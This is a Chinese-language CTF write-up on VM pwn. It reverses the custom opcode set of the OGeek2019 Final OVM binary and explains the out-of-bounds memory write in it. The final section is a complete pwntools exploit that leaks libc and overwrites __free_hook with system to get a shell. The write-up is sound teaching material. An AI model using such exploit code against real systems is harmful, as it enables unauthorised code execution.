前言
==

VMPWN，从未设计过。通过学习总结出一个约等式：VMPWN约等于逆向。

感觉VMPWN逆向很麻烦，漏洞大多都是一些越界写等。

个人对VMPWN的理解
===========

vm程序在程序中模拟出类似于机器码识别的功能，如通过用户输入想要执行命令，需要用户按照程序的指令对应规则去输入对应的机器码。因为这里所说的机器码并不是真正被计算机操作系统所识别的机器码，而是能或只能被此程序识别并执行的机器码，故我们姑且将其称为伪机器码（一些大佬在很久之前就这么称呼了。我查阅了很多资料还有大佬的博客，我们最后输入的伪机器码也被称为：OPCODE。并且这种题其实并没有太多的知识点，主要是对程序中的虚拟指令对应关系的逆向，然后才能进行漏洞利用。

前置知识
====

程序是怎么执行指令的？在编译的时候，编译器会将代码转化为汇编代码然后根据操作系统规定的规则进行机器码的一一对应置换，操作系统通过识别机器码去执行对应的操作。比如说随便取一个程序的一段汇编：

```···
.text:00000000000007DA                 mov     edx, 64h ; 'd'  ; nbytes
.text:00000000000007DF                 lea     rsi, buf        ; buf
.text:00000000000007E6                 mov     edi, 0          ; fd
.text:00000000000007EB                 mov     eax, 0
.text:00000000000007F0                 call    _read
```

在Hex View-1窗口中看到的视图是这样的

```··
00000000000007D0  00 00 48 89 C7 E8 96 FE  FF FF BA 64 00 00 00 48  ..H........d...H
00000000000007E0  8D 35 5A 08 20 00 BF 00  00 00 00 B8 00 00 00 00  .5Z. ...........
00000000000007F0  E8 5B FE FF FF 48 8D 35  B8 00 00 00 48 8D 3D 3D  .....H.5....H.==
```

如果我们按照地址一一对应的话，就可以得到这样的对应关系：

```··
BA 64 00 00 00            mov     edx, 64h
48 8D 35 5A 08 20 00      lea     rsi, buf
BF 00 00 00 00            mov     edi, 0
B8 00 00 00 00            mov     eax, 0
E8 5B FE FF FF            call    _read
```

这样的机制同样是使用与vmpwn的程序中的，只是其指令和机器码一一对应的关系是不同的。

还有就是vm程序在运行过程中输出字符串的时候，我们在编程的时候会有写像这样的代码：

```c
printf("%d",buf);
```

buf中存储的是字符串的地址，这样来输出字符串，但是我们不能写成下面这样

```c
printf("%d",'hello world!');
```

像这样的一个字符串按照编译的知识，它应该被存储在data段这样的数据存储区。

所以说我们在制作一个简单的VM，就需要具备一个程序应该有的一些结构和空间。比如：寄存器，栈，缓冲区域等。我们可以根据自己喜欢的方式来写属于自己的函数调用约定，写自己喜欢的存储方式。那么总结一下vm就是利用编写程序来实现模拟寄存器、stack、数据缓冲区来实现执行自己定义的虚拟指令（可能不太准确。

vmpwn大概就是利用程序规定的虚拟指令，来利用程序中的漏洞。

下面看几个名词解释：

虚拟机保护技术：所谓虚拟机保护技术，是指将代码翻译为机器和人都无法识别的一串伪代码字节流；在具体执行时再对这些伪代码进行一一翻译解释，逐步还原为原始代码并执行。这段用于翻译伪代码并负责具体执行的子程序就叫作虚拟机VM（好似一个抽象的CPU）。它以一个函数的形式存在，函数的参数就是字节码的内存地址。

VStartVM：虚拟机的入口函数，对虚拟机环境进行初始化。

VMDispather：解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环。

opcode：程序可执行代码转换成的操作码。

还有几个寄存器需要了解：

1. `PC`程序计数器，存放的是一个内存地址，该地址中存放着下一条要执行的计算机指令；
2. `SP`指针寄存器，永远指向当前栈顶
3. `BP`基址寄存器，用于指向栈的某些地址，在调用函数的时候会用到
4. `AX`通用寄存器，用于存放一条指令执行后的结果

实践
==

纸上得来终觉浅，觉知此事要躬行。做几个题分析一下熟悉VMPWN做题流程。

\[OGeek2019 Final\]OVM
----------------------

### 例行检查

64位，除了canary，其他保护全开。

### 逆向

#### mian()

mian函数主要的功能就是

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int16 v4; // [rsp+2h] [rbp-Eh] BYREF
  unsigned __int16 v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int16 v6; // [rsp+6h] [rbp-Ah] BYREF
  int v7; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  comment = malloc(0x8CuLL);                    // 存储最后的how feel，free时可利用其提权
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  signal(2, signal_handler);
  write(1, "WELCOME TO OVM PWN\n", 0x16uLL);
  write(1, "PC: ", 4uLL);
  _isoc99_scanf("%hd", &v5);                    // 输入PC寄存器内容
  getchar();
  write(1, "SP: ", 4uLL);
  _isoc99_scanf("%hd", &v6);                    // 输入SP寄存器内容
  getchar();
  reg[13] = v6;                                 // reg为寄存器的意思，13下表为SP寄存器
  reg[15] = v5;                                 // 下表15为PC寄存器
  write(1, "CODE SIZE: ", 0xBuLL);
  _isoc99_scanf("%hd", &v4);                    // 输入opcode的大小
  getchar();
  if ( v6 + (unsigned int)v4 > 0x10000 || !v4 )
  {
    write(1, "EXCEPTION\n", 0xAuLL);
    exit(155);
  }
  write(1, "CODE: ", 6uLL);
  running = 1;
  for ( i = 0; v4 > i; ++i )
  {
    _isoc99_scanf("%d", &memory[v5 + i]);       // 读入opcode
    if ( (memory[i + v5] & 0xFF000000) == -16777216 )
      memory[i + v5] = -536870912;
    getchar();
  }
  while ( running )
  {
    v7 = fetch();                               // 用于每一次循环后跳转执行下一条指令
    execute(v7);                                // 执行输入的opcode
  }
  write(1, "HOW DO YOU FEEL AT OVM?\n", 0x1BuLL);
  read(0, comment, 0x8CuLL);
  sendcomment(comment);
  write(1, "Bye\n", 4uLL);
  return 0;
}
```

#### fetch()

返回当前指令之后，跳转到下一条指令。

```c
__int64 fetch()
{
  int v0; // eax

  v0 = reg[15];
  reg[15] = v0 + 1;
  return (unsigned int)memory[v0];           // memory存储的是输入的opcode
}
```

#### execute()

执行函数的逆向才是VMPWN的核心。

我们先了解几个宏函数

```c
#define LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) & 0xffff))
#define HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) >> 16) & 0xffff))
#define LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) & 0xff))
#define HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) >> 8) & 0xff))
```

在execute()函数里面的分开来理解

```c
  v4 = (a1 & 0xF0000u) >> 16;                   // opcode的倒数第三字节  后面称为高
  v3 = (unsigned __int16)(a1 & 0xF00) >> 8;     // opcode的倒数第二字节  后面称为中
  v2 = a1 & 0xF;                                // opcode的最低字节      后面称为低
  result = HIBYTE(a1);                          // 取opcode的最高位
```

这一段的主要作用就是进行寄存器的加减函数赋值，高=中+低

```c
  if ( HIBYTE(a1) == 0x70 )
  {
    result = (ssize_t)reg;
    reg[v4] = reg[v2] + reg[v3];
    return result;
  }
```

高=中^低

```c
    if ( HIBYTE(a1) == 176 )
    {
      result = (ssize_t)reg;
      reg[v4] = reg[v2] ^ reg[v3];
      return result;
    }
```

高=中除以2的低次方

```c
      if ( HIBYTE(a1) == 208 )
      {
        result = (ssize_t)reg;
        reg[v4] = (int)reg[v3] >> reg[v2];
        return result;
      }
```

退出的指令

```c
        if ( HIBYTE(a1) == 224 )
        {
          running = 0;
          if ( !reg[13] )
            return write(1, "EXIT\n", 5uLL);
        }
```

高=中\*2的低次方

```c
      else if ( HIBYTE(a1) == 192 )
      {
        result = (ssize_t)reg;
        reg[v4] = reg[v3] << reg[v2];
      }
```

分别是：高=中&amp;低、高=中|低、高=中-低

```c
    else
    {
      switch ( HIBYTE(a1) )
      {
        case 0x90u:
          result = (ssize_t)reg;
          reg[v4] = reg[v2] & reg[v3];
          break;
        case 0xA0u:
          result = (ssize_t)reg;
          reg[v4] = reg[v2] | reg[v3];
          break;
        case 0x80u:
          result = (ssize_t)reg;
          reg[v4] = reg[v3] - reg[v2];
          break;
      }
```

高=opcode\[低\]

```c
  else if ( HIBYTE(a1) == 48 )
  {
    result = (ssize_t)reg;
    reg[v4] = memory[reg[v2]];
  }
```

一些stack的操作

```c
    switch ( HIBYTE(a1) )
    {
      case 'P':
        LODWORD(result) = reg[13];
        reg[13] = result + 1;
        result = (int)result;
        stack[(int)result] = reg[v4];
        break;
      case '`':
        --reg[13];
        result = (ssize_t)reg;
        reg[v4] = stack[reg[13]];
        break;
      case '@':
        result = (ssize_t)memory;
        memory[reg[v2]] = reg[v4];
        break;
    }
  }
```

```c
  else if ( HIBYTE(a1) == 16 )
  {
    result = (ssize_t)reg;
    reg[v4] = (unsigned __int8)a1;
  }
  else if ( HIBYTE(a1) == 32 )
  {
    result = (ssize_t)reg;
    reg[v4] = (_BYTE)a1 == 0;
  }
  return result;
}
```

不难总结出opcode本身的格式：

```·
操作码     目标寄存器(高)      寄存器1(中)      寄存器2(低)
```

还有操作数所对应的操作

```c
0x10 ： mov  reg[高]  num
0x20 :  mov  reg[高]  0
0x30 ： mov  reg[高]  memory[reg[低]]
0x40 ： mov  memory[reg[低]]  reg[高]
0x50 ： push
0x60 ： pop
0x70 ： add
0x80 ： sub
0x90 ： and
0xa0 ： or
0xb0 ： xor
0xc0 ： <<
0xd0 :  >>
0xe0 :  exit() 也有输出寄存器内容的功能
```

### 漏洞利用

看了好多VMPWN的题目大部分的漏洞都是越界写，这个题也不例外。

memory对索引没有什么检测，造成了越界写，这样的话我们思路就很清晰了。

通过越界写将comment的指针修改为**free\_hook+8,然后在\_\_free\_hook+8位置写入/bin/sh，在**free\_hook位置写入system，执行free(comment)的时候就会执行system(/bin/sh)

exp：

```python
#encoding = utf-8
import sys
import time
from pwn import *
from LibcSearcher import * 

context.log_level = "debug"
context.os = 'linux'

binary = "pwn"
libcelf = "libc-2.23.so"
ip = ""
port = ""
local = 1
arm = 0
core = 64

og = [0x4342,0x3342]

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

if(local==1):
    if(arm==1):
        if(core==64):
            p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabi",binary])
        if(core==32):
            p = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu/", binary])
    else:
        p = process(binary)
else:
    p = remote(ip,port)

elf = ELF(binary)
libc = ELF(libcelf)

def choice(cho):
    sla('',cho)

def gdb():
    gdb.attach(p)

def add(idx,size,content):
    choice()
    sla('',idx)
    sla('',size)
    sla('',content)

def delete(idx):
    choice()
    sla('',idx)

def show(idx):
    choice()
    sla('',idx)

def edit(idx,size,content):
    choice()
    sla('',idx)
    sla('',size)
    sla('',content) 

def opcode(num,reg,op2,op1):
    code = num<<24
    code += reg<<16
    code += op2<<8
    code += op1
    code = str(code)
    sl(code)

def leak_libc(addr):
    global libc_base,mh,fh,system,binsh_addr,_IO_2_1_stdout_,realloc
    libc_base = addr - libc.sym['puts']
    leak("libc base ",libc_base) 
    mh = libc_base + libc.sym['__malloc_hook']
    system = libc_base + libc.sym['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    realloc = libc_base + libc.sym['realloc']
    fh = libc_base + libc.sym['__free_hook']
    _IO_2_1_stdout_ = libc_base + libc.sym['_IO_2_1_stdout_']

def leak_libcsearcher(name,addr):
    global libc_base,system,binsh_addr
    libc = LibcSearcher(str(name),addr)
    libc_base = addr - libc.dump[str(name)]
    leak("libc base ",libc_base)
    system = libc_base + libc.dump['system']
    binsh_addr = libc_base + libc.dump['str_bin_sh']

def got(name):
    got_addr = elf.got[str(name)]
    return got_addr

def plt(name):
    plt_addr = elf.plt[str(name)]
    return plt_addr

def pwn():
    sla('PC: ',str(0))
    sla('SP: ',str(1))
    sla('SIZE: ',str(23))
    opcode(0x10,0,0,26)
    opcode(0x10,1,0,0)
    opcode(0x80,4,1,0)
    opcode(0x30,2,0,4)
    opcode(0x10,0,0,25)
    opcode(0x80,4,1,0)
    opcode(0x30,3,0,4)

    opcode(0x10,0,0,1)
    opcode(0x10,1,0,12)
    opcode(0xc0,4,0,1)
    opcode(0x10,0,0,0xa)
    opcode(0x10,1,0,4)
    opcode(0xc0,5,0,1)
    opcode(0x70,4,4,5)
    opcode(0x70,2,2,4)

    opcode(0x10,0,0,8)
    opcode(0x10,1,0,0)
    opcode(0x80,4,1,0)
    opcode(0x40,2,0,4)
    opcode(0x10,0,0,7)
    opcode(0x80,4,1,0)
    opcode(0x40,3,0,4)
    opcode(0xe0,0,0,0)

    ru("R2: ")
    low = int(ru('\n').strip(), 16) + 8
    ru("R3: ")
    high = int(ru('\n').strip(), 16)
    free_hook = (high<<32)+low
    success("free_hook:"+hex(free_hook))
    libc.address = free_hook - libc.sym['__free_hook']
    system = libc.sym['system']
    sla("HOW DO YOU FEEL AT OVM?\n",'/bin/sh\x00'+p64(system))
    itr()

'''
i = 0
while 1:
    i += 1
    log.warn(str(i))
    try:
        pwn()
    except Exception:
        p.close()
        if(local == 1):
            p = process(binary)
        else:
            p = remote(ip,port)
        continue
'''

if __name__ == '__main__':
    pwn()
```

参考链接：

[VMpwn~~\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1mf4y1Q7Hq/)

[VMPwn入门学习 | A1ex`&#39;'`s Blog](https://a1ex.online/2020/11/20/VMPwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/)

[VM Pwn学习 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/208450#h2-1)